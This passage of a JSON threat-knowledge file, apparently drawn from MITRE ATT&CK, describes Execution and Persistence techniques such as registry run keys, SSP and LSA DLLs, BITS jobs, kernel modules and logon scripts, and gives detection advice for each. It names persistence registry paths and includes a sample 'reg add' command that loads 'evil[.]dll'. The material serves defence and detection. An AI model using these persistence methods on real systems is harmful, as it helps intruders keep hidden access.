        "detection": "\nMonitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to Deobfuscate/Decode Files or Information in payloads.Anti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).\n\n\n\n\n\n\n\n\n\n\n"
      },
      "T1204.001": {
        "name": "Malicious Link",
        "description": " \nAn adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from  Spearphishing Link . Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via  Exploitation for Client Execution . Links may also lead users to download files that require execution via  Malicious File .  ",
        "detection": "\nInspect network traffic for indications that a user visited a malicious site, such as links included in phishing campaigns directed at your organization.Anti-virus can potentially detect malicious documents and files that are downloaded from a link and executed on the user's computer.\n\n"
      },
      "T1204.002": {
        "name": "Malicious File",
        "description": " \nAn adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from  Spearphishing Attachment . Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl. \nAdversaries may employ various forms of  Masquerading on the file to increase the likelihood that a user will open it. \nWhile  Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after  Internal Spearphishing .  ",
        "detection": "\nMonitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to Deobfuscate/Decode Files or Information in payloads.Anti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).\n\n"
      },
      "T1047": {
        "name": "Windows Management Instrumentation",
        "description": " \nAdversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB)  \nand Remote Procedure Call Service (RPCS)  \nfor remote access. RPCS operates over port 135.  \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement.  \n  \n ",
        "detection": "\nMonitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of \"wmic\" and detect commands that are used to perform remote behavior.\n\n"
      }
    }
  },
  "TA0003": {
    "name": "Persistence",
    "description": "\nThe adversary is trying to maintain their foothold.Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. \n",
    "technique": {
      "T1098": {
        "name": "Account Manipulation",
        "description": " \nAdversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.  ",
        "detection": "\nCollect events that correlate with changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670.    Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ  or that include additional flags such as changing a password without knowledge of the old password. Monitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.Monitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts.\n\n"
      },
      "T1098.001": {
        "name": "Additional Cloud Credentials",
        "description": " \nAdversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment. \nAdversaries may add credentials for Azure Service Principals in addition to existing legitimate credentials  \nto victim Azure accounts.  \n \nAzure Service Principals support both password and certificate credentials.  \nWith sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az  PowerShell modules.  \n\nAfter gaining access through  Cloud Accounts , adversaries may generate or import their own SSH keys using either the  CreateKeyPair or  ImportKeyPair API in AWS or the  gcloud compute os-login ssh-keys add command in GCP.  \nThis allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.  \n \n ",
        "detection": "\nMonitor Azure Activity Logs for service principal modifications. Monitor for the usage of APIs that create or import SSH keys, particularly by unexpected users or accounts such as the root account.Monitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.\n\n"
      },
      "T1098.002": {
        "name": "Exchange Email Delegate Permissions",
        "description": " \nAdversaries may grant additional permission levels, such as ReadPermission or FullAccess, to maintain persistent access to an adversary-controlled email account. The  Add-MailboxPermission   PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.  \n \n \n\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex:  Internal Spearphishing ), so the messages evade spam/phishing detection mechanisms.  \n ",
        "detection": "\nMonitor for unusual Exchange and Office 365 email account permissions changes that may indicate excessively broad permissions being granted to compromised accounts.A larger than normal volume of emails sent from an account and similar phishing emails sent from \u202freal accounts within a network may be a sign that an account was compromised and attempts to leverage access with modified email permissions is occurring.\n\n"
      },
      "T1098.003": {
        "name": "Add Office 365 Global Administrator Role",
        "description": " \nAn adversary may add the Global Administrator role to an adversary-controlled account to maintain persistent access to an Office 365 tenant.  \n \nWith sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins) via the global admin role.  \n \nThis account modification may immediately follow  Create Account or other malicious account activity.  ",
        "detection": "\nCollect usage logs from cloud administrator accounts to identify unusual activity in the assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins. \n\n"
      },
      "T1098.004": {
        "name": "SSH Authorized Keys",
        "description": " \nAdversaries may modify the SSH  authorized_keys file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The  authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under  <user-home>/.ssh/authorized_keys .  \nUsers may edit the system’s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value \"yes\" to ensure public key and RSA authentication are enabled. The SSH config file is usually located under  /etc/ssh/sshd_config . \nAdversaries may modify SSH  authorized_keys files directly with scripts or shell commands to add their own adversary-supplied public keys. This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.  \n  \n ",
        "detection": "\nUse file integrity monitoring to detect changes made to the authorized_keys file for each user on a system. Monitor for suspicious processes modifying the authorized_keys file.Monitor for changes to and suspicious processes modifiying /etc/ssh/sshd_config.\n\n"
      },
      "T1197": {
        "name": "BITS Jobs",
        "description": " \nAdversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through  Component Object Model (COM).  \n  \nBITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations. \nThe interface to create and manage BITS jobs is accessible through  PowerShell   \nand the  BITSAdmin tool.  \n\nAdversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.  \n  \n  \nBITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).  \n  \n\nBITS upload functionalities can also be used to perform  Exfiltration Over Alternative Protocol .  \n ",
        "detection": "\nBITS runs as a service and its status can be checked with the Sc query utility (sc query bits).   Active BITS tasks can be enumerated using the BITSAdmin tool (bitsadmin /list /allusers /verbose).  Monitor usage of the BITSAdmin tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)   Admin and the Windows Event log for BITS activity. Also consider investigating more detailed information about jobs by parsing the BITS job database.  Monitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account).  \n\n"
      },
      "T1547": {
        "name": "Boot or Logon Autostart Execution",
        "description": " \nAdversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.  \n \n \n \n \nThese mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel. \nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.  ",
        "detection": "\nMonitor for additions or modifications of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry. Look for changes that are not correlated with known updates, patches, or other planned administrative activity. Tools such as Sysinternals Autoruns may also be used to detect system autostart configuration changes that could be attempts at persistence.   Changes to some autostart configuration settings may happen under normal conditions when legitimate software is installed. Suspicious program execution as autostart programs may show up as outlier processes that have not been seen before when compared against historical data.To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL.Monitor for abnormal usage of utilities and command-line parameters involved in kernel modification or driver installation.\n\n"
      },
      "T1547.001": {
        "name": "Registry Run Keys / Startup Folder",
        "description": " \nAdversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.  \nThese programs will be executed under the context of the user and will have the account's associated permissions level. \nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is  C:\\Users[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup . The startup folder path for all users is  C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp . \nThe following run keys are created by default on Windows systems:  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce \nRun keys may exist under multiple hives.  \n \nThe  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.  \nFor example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx:  reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"   \n\nThe following Registry keys can be used to set startup folder items for persistence:  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders \nThe following Registry keys can control automatic startup of services during boot:  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices \nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run \nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit and  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell subkeys can automatically launch programs. \nPrograms listed in the load value of the registry key  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run when any user logs on. \nBy default, the multistring  BootExecute value of the registry key  HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to  autocheck autochk * . This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot. \nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use  Masquerading to make the Registry entries look as if they are associated with legitimate programs.  ",
        "detection": "\nMonitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.   Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.Changes to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1547.002": {
        "name": "Authentication Package",
        "description": " \nAdversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.  \n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location  HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ with the key value of  \"Authentication Packages\"=<target binary> . The binary will then be executed by the system when the authentication packages are loaded.  ",
        "detection": "\nMonitor the Registry for changes to the LSA Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned DLLs try to load into the LSA by setting the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe with AuditLevel = 8.    \n\n"
      },
      "T1547.003": {
        "name": "Time Providers",
        "description": " \nAdversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.  \nW32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.  \n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\ .  \nThe time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.  \n\nAdversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.  \n ",
        "detection": "\nBaseline values and monitor/analyze activity related to modifying W32Time information in the Registry, including application programming interface (API) calls such as RegCreateKeyEx and RegSetValueEx as well as execution of the W32tm.exe utility.   There is no restriction on the number of custom time providers registrations, though each may require a DLL payload written to disk.  The Sysinternals Autoruns tool may also be used to analyze auto-starting locations, including DLLs listed as time providers.  \n\n"
      },
      "T1547.004": {
        "name": "Winlogon Helper DLL",
        "description": " \nAdversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in  HKLM\\Software[\\Wow6432Node\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and  HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon.  \n \nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:  \nWinlogon\\Notify - points to notification package DLLs that handle Winlogon events Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on \nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.  ",
        "detection": "\nMonitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values.    New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\n"
      },
      "T1547.005": {
        "name": "Security Support Provider",
        "description": " \nAdversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. \nThe SSP configuration is stored in two Registry keys:  HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and  HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages . An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.  \n ",
        "detection": "\nMonitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe with AuditLevel = 8.    \n\n"
      },
      "T1547.006": {
        "name": "Kernel Modules and Extensions",
        "description": " \nAdversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.  \n \nWhen used maliciously, LKMs can be a type of kernel-mode  Rootkit that run with the highest operating system privilege (Ring 0).  \nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users.  \n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through  kextload and  kextunload commands. \nAdversaries can use LKMs and kexts to covertly persist on a system and elevate privileges. Examples have been found in the wild and there are some open source projects.  \n  \n  \n  \n \n  \n \n  \n ",
        "detection": "\nLoading, unloading, and manipulating modules on Linux systems can be detected by monitoring for the following commands:modprobe, insmod, lsmod, rmmod, or modinfo   LKMs are typically loaded into /lib/modules and have had the extension .ko (\"kernel object\") since version 2.6 of the Linux kernel.  For macOS, monitor for execution of kextload commands and correlate with other unknown or suspicious activity.Adversaries may run commands on the target system before loading a malicious module in order to ensure that it is properly compiled.   Adversaries may also execute commands to identify the exact version of the running Linux kernel and/or download multiple versions of the same .ko (kernel object) files to use the one appropriate for the running system.  Many LKMs require Linux headers (specific to the target kernel) in order to compile properly. These are typically obtained through the operating systems package manager and installed like a normal package. On Ubuntu and Debian based systems this can be accomplished by running: apt-get install linux-headers-$(uname -r) On RHEL and CentOS based systems this can be accomplished by running: yum install kernel-devel-$(uname -r)\n\n"
      },
      "T1547.007": {
        "name": "Re-opened Applications",
        "description": " \nAdversaries may modify plist files to automatically run an application when a user logs in. Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user logs into their machine after reboot. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at  ~/Library/Preferences/com.apple.loginwindow.plist and  ~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist . \nAn adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine  \n.  ",
        "detection": "\nMonitoring the specific plist files associated with reopening applications can indicate when an application has registered itself to be reopened.\n\n"
      },
      "T1547.008": {
        "name": "LSASS Driver",
        "description": " \nAdversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.  \n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g.,  Hijack Execution Flow ), an adversary can use LSA operations to continuously execute malicious payloads.  ",
        "detection": "\nWith LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers.   Also monitor DLL load operations in lsass.exe.  Utilize the Sysinternals Autoruns/Autorunsc utility   to examine loaded drivers associated with the LSA. \n\n"
      },
      "T1547.009": {
        "name": "Shortcut Modification",
        "description": " \nAdversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. \nAdversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use  Masquerading to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.  ",
        "detection": "\nSince a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.\n\n"
      },
      "T1547.010": {
        "name": "Port Monitors",
        "description": " \nAdversaries may use port monitors to run an attacker supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the  AddMonitor API call to set a DLL to be loaded at startup.  \nThis DLL can be located in  C:\\Windows\\System32 and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.  \nAlternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to  HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors . \nThe Registry key contains entries for the following: Local Port Standard TCP/IP Port USB Monitor WSD Port \nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.  ",
        "detection": "\nMonitor process API calls to AddMonitor.  Monitor DLLs that are loaded by spoolsv.exe for DLLs that are abnormal. New DLLs written to the System32 directory that do not correlate with known good software or patching may be suspicious. Monitor Registry writes to HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors. Run the Autoruns utility, which checks for this Registry key as a persistence mechanism  \n\n"
      },
      "T1547.011": {
        "name": "Plist Modification",
        "description": " \nAdversaries may modify plist files to run a program during system boot or user login. Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as  /Library/Preferences (which execute with elevated privileges) and  ~/Library/Preferences (which execute with a user's privileges). \nAdversaries can modify plist files to execute their code as part of establishing persistence. plists may also be used to elevate privileges since they may execute in the context of another user.  \n \nA specific plist used for execution at login is  com.apple.loginitems.plist .  \nApplications under this plist run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them.  \nUsers have direct control over login items installed using a shared file list which are also visible in System Preferences  \n. Some of these applications can open visible dialogs to the user, but they don’t all have to since there is an option to \"hide\" the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in  \n  \n. The API method  SMLoginItemSetEnabled can be used to set Login Items, but scripting languages like  AppleScript can do this as well.  \n ",
        "detection": "\nFile system monitoring can determine if plist files are being modified. Users should not have permission to modify these in most cases. Some software tools like \"Knock Knock\" can detect persistence mechanisms and point to the specific files that are being referenced. This can be helpful to see what is actually being executed.All the login items created via shared file lists are viewable by going to the Apple menu -> System Preferences -> Users & Groups -> Login items. This area (and the corresponding file locations) should be monitored and allowed for known good applications. Otherwise, Login Items are located in  Contents/Library/LoginItems  within an application bundle, so these paths should be monitored as well. Monitor process execution for abnormal process execution resulting from modified plist files. Monitor utilities used to modify plist files or that take a plist file as an argument, which may indicate suspicious activity.\n\n"
      },
      "T1547.012": {
        "name": "Print Processors",
        "description": " \nAdversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot. \nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the  AddPrintProcessor API call with an account that has  SeLoadDriverPrivilege enabled. Alternatively, a print processor can be registered to the print spooler service by adding the  HKLM\\SYSTEM\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\[Windows architecture: e.g., Windows x64]\\Print Processors\\[user defined]\\Driver Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the  GetPrintProcessorDirectory API call.  \nAfter the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.  \nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.  ",
        "detection": "\nMonitor process API calls to AddPrintProcessor and GetPrintProcessorDirectory. New print processor DLLs are written to the print processor directory. Also monitor Registry writes to HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\[Windows architecture]\\Print Processors\\[user defined]\\Driver or HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\[Windows architecture]\\Print Processors\\[user defined]\\Driver as they pertain to print processor installations.Monitor for abnormal DLLs that are loaded by spoolsv.exe. Print processors that do not correlate with known good software or patching may be suspicious.\n\n"
      },
      "T1037": {
        "name": "Boot or Logon Initialization Scripts",
        "description": " \nAdversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely. \nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.  ",
        "detection": "\nMonitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.\n\n"
      },
      "T1037.001": {
        "name": "Logon Script (Windows)",
        "description": " \nAdversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.  \nThis is done via adding a path to a script to the  HKCU\\Environment\\UserInitMprLogonScript Registry key.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.  ",
        "detection": "\nMonitor for changes to Registry values associated with Windows logon scrips, nameley HKCU\\Environment\\UserInitMprLogonScript.Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.\n\n"
      },
      "T1037.002": {
        "name": "Logon Script (Mac)",
        "description": " \nAdversaries may use macOS logon scripts automatically executed at logon initialization to establish persistence. macOS allows logon scripts (known as login hooks) to be executed whenever a specific user logs into a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike  Startup Items , a login hook executes as the elevated root user.  \n\nAdversaries may use these login hooks to maintain persistence on a single system.  \nAccess to login hook scripts may allow an adversary to insert additional malicious code. There can only be one login hook at a time though and depending on the access configuration of the hooks, either local credentials or an administrator account may be necessary.  ",
        "detection": "\nMonitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.\n\n"
      },
      "T1037.003": {
        "name": "Network Logon Script",
        "description": " \nAdversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.  \nThese logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems. \nAdversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.  ",
        "detection": "\nMonitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.\n\n"
      },
      "T1037.004": {
        "name": "Rc.common",
        "description": " \nAdversaries may use rc.common automatically executed at boot initialization to establish persistence. During the boot process, macOS executes  source /etc/rc.common , which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings and is thus recommended to include in the start of Startup Item Scripts  \n. In macOS and OS X, this is now a deprecated mechanism in favor of  Launch Agent and  Launch Daemon but is currently still used. \nAdversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user.  \n ",
        "detection": "\nThe /etc/rc.common file can be monitored to detect changes from the company policy. Monitor process execution resulting from the rc.common script for unusual or unknown applications or behavior. \n\n"
      },
      "T1037.005": {
        "name": "Startup Items",
